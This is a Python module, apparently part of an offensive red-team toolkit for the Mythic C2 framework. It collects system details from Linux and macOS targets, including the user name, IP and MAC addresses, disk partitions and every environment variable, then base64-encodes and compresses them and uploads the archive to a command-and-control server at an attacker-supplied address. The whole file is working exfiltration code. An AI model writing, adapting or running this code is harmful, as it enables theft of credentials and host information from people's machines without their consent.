'''
 # @ Create Time: 2024-09-04 11:10:07
 # @ Modified time: 2024-09-04 11:35:24
 # @ Description: class to collect system information from linux/mac targets
 '''
import platform
import socket
import psutil
import os
import uuid
import getpass
import browserhistory as bh
import base64
import zipfile
import gzip
from mythic_container.MythicGoRPC import *
from mythic_container.MythicRPC import MythicRPC
from pathlib import Path
import tempfile
import json
import asyncio
from dotenv import load_dotenv

# load .env for sensitive tokens
load_dotenv()

class SysInfoScanner:
    def __init__(self, save_location: Path):
        
        self.save_location = save_location
        

    async def get_latest_task_id(self,):
        # initialize MythicRPC instance
    
        # ----- old RPC solution -----
        rpc = MythicRPC()
        # fetch the latest callback
        response = await rpc.execute("get_callback_info", callback_id=7)
        callbacks = response.get("callbacks",[])

        if not callbacks:
            raise RuntimeError("[-] No callbacks found.")
        
        # Extract the callback ID
        callback_id = callbacks[0]["id"]

        # fetch the tasks associated with this callback
        response = await rpc.execute("get_all_tasks", callback_id=callback_id, limit=1)
        tasks = response.get("tasks", [])
        if tasks:
            return tasks[0].get("id")
        else:
            raise RuntimeError("[-] No tasks found for this callback.")


    async def upload_file(self, task_id: int, local_file_path:str, filename: str, remote_path:str):
        rpc = MythicRPC()

        response = await rpc.execute(
                "upload_file",
                file = local_file_path,
                filename = filename,
                delete_after_fetch=False
                )
        
        mythic_file_id = response.get("agent_file_id")

        if mythic_file_id:
            await MythicRPC.execute(
                "create_subtask",
                task_id = task_id,
                command="upload",
                params = {"file": mythic_file_id, "remote_path": remote_path}
                )
        else:
            print("[-] File upload to Mythic Failed")


    def os_info(self, ):

        return {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Release": platform.release()
                }

    def mach_proc_info(self,):

        return {
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Architecture": platform.architecture(),

        }

    def user_info(self,):

        return {
            "User": getpass.getuser()
        }
        
    def network_info(self,):

        return {
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                    for elements in range(0,2*6,2)][::-1])
        }

    def disk_info(self,):

        disk_info = psutil.disk_partitions()

        return {
            "Disk Partitions": [{"device": d.device, "mountpoint": d.mountpoint, 
                                 "fstype": d.fstype} 
                                for d in disk_info]
        }

    def mem_info(self,):

        virtual_mem = psutil.virtual_memory()

        return {
            "Total Memory": virtual_mem.total,
            "Available Memory": virtual_mem.available
        }

    def env_info(self,):
        return {
            "Environment Variables": dict(os.environ)
        }
    
    def _encode(self, info:dict):
        ''' encode extracted system info with base64
        
        '''
        # convert dict to JSON string
        info_str = json.dumps(info)

        encoded_bytes = base64.b64encode(info_str.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')
        return encoded_str

    def _compress(self, info, save_location):
        ''' compress extracted info adapting the compression level to the OS type
        
        '''
        save_path = Path(save_location).joinpath("info.zip")
        os_type = platform.system()
        if os_type == "Windows":
            # standard compression
            compression_level = zipfile.ZIP_DEFLATED
            with zipfile.ZipFile(save_path, 'w', compression=compression_level) as zipf:
                zipf.writestr('info.zip', info)

        elif os_type == 'Linux':
            compression_level = 6  # Balanced compression
            with gzip.open(save_path, 'wb', compresslevel=compression_level) as gzfile:
                gzfile.write(info.encode("utf-8"))
                
        else:  # macOS or other systems
            compression_level = 9  # Maximum compression
            with gzip.open(save_path, 'wb', compresslevel=compression_level) as gzfile:
                gzfile.write(info.encode("utf-8"))


    def _system_info(self,):
        ''' the module to scan system info and export to somewhere
        
        '''
        system_info = {}
        system_info.update(self.os_info())
        system_info.update(self.mach_proc_info())
        system_info.update(self.user_info())
        system_info.update(self.network_info())
        system_info.update(self.disk_info())
        system_info.update(self.mem_info())
        system_info.update(self.env_info())

        # encode
        encoded_info = self._encode(system_info)
        # compress
        self._compress(encoded_info, self.save_location)

async def run():

    os.environ['MYTHIC_USERNAME'] = os.getenv("ADMINUSER")
    os.environ["MYTHIC_PASSWORD"] = os.getenv("PASSWORD")
    os.environ["MYTHIV_HOST"] = os.getenv("ATTACK_IP")
    os.environ["MYTHIC_VHOST"] = os.getenv("MYTHIC_VHOST")

    temp_path = tempfile.gettempdir()
    sysscanner = SysInfoScanner(temp_path)
    # define the file
    file_name = "info.zip"

    # get the information and saved to a temp folder
    sysscanner._system_info()
    final_path = Path(temp_path).joinpath(file_name)

    if not final_path.exists():
        print(f"[-] File not found: {final_path}")

    # Fetch task ID for C2 Upload
    try:
        task_id = await sysscanner.get_latest_task_id()
    except Exception as e:
        print(f"[-] Could not get task ID: {e}")
        return
    # upload file to c2 server
    remote_file = Path(temp_path).joinpath(file_name)
    await sysscanner.upload_file(
            task_id, 
            final_path.as_posix(), 
            file_name, 
            remote_file.as_posix())


if __name__ == "__main__":
    asyncio.run(run())